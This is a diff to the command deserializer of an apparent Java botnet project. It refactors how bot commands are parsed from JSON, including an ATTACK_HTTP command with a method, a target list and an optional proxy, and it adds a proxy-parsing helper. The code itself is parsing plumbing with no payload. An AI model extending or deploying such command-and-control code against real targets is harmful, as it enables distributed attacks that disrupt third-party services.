@@ -26,12 +26,12 @@
 
 package com.acmutv.botnet.core.command.json;
 
+import com.acmutv.botnet.tool.net.HttpMethod;
+import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.string.TemplateEngine;
-import com.acmutv.botnet.core.attack.http.HttpAttackMethod;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.CommandScope;
 import com.acmutv.botnet.core.target.HttpTarget;
-import com.acmutv.botnet.core.target.HttpTargetProxy;
 import com.acmutv.botnet.tool.time.Duration;
 import com.fasterxml.jackson.core.JsonParser;
 import com.fasterxml.jackson.core.JsonProcessingException;
@@ -131,7 +131,7 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
         case SHUTDOWN:
           if (!node.has("timeout")) {
-            throw new IOException("Cannot read command parameter [timeout] for scope [SHUTDOWN] (missing)");
+            throw new IOException("Cannot read parameter [timeout] for scope [SHUTDOWN] (missing)");
           }
           final Duration shutdownTimeout = parseObject(node.get("timeout"), Duration.class);
           cmd.getParams().put("timeout", shutdownTimeout);
@@ -139,12 +139,12 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
         case ATTACK_HTTP:
           if (!node.has("method") || !node.has("targets")) {
-            throw new IOException("Cannot read command parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
+            throw new IOException("Cannot read parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
           }
-          final HttpAttackMethod httpAttackMethod = HttpAttackMethod.from(node.get("method").asText());
+          final HttpMethod httpAttackMethod = HttpMethod.from(node.get("method").asText());
           final List<HttpTarget> httpTargets = parseList(node.get("targets"), HttpTarget.class);
-          final HttpTargetProxy httpProxy = (node.has("proxy")) ?
-              parseObject(node.get("proxy"), HttpTargetProxy.class) : null;
+          final HttpProxy httpProxy = (node.hasNonNull("proxy")) ?
+              parseHttpProxy(node.get("proxy")) : null;
           cmd.getParams().put("method", httpAttackMethod);
           cmd.getParams().put("targets", httpTargets);
           cmd.getParams().put("proxy", httpProxy);
@@ -175,6 +175,21 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
       obj = null;
     }
     return obj;
+  }
+
+  /**
+   * Parses an {@link HttpProxy} from a JSON node.
+   * @param node the JSON node to parse.
+   * @return the parsed {@link HttpProxy}.
+   * @throws IOException when proxy cannot be parsed.
+   */
+  private static HttpProxy parseHttpProxy(JsonNode node) throws IOException {
+    if (!node.has("address") || !node.has("port")) {
+      throw new IOException("Cannot read parameters [address,port] for object [PROXY]");
+    }
+    final String address = node.get("address").asText();
+    final int port = node.get("port").asInt();
+    return new HttpProxy(address, port);
   }
 
   /**
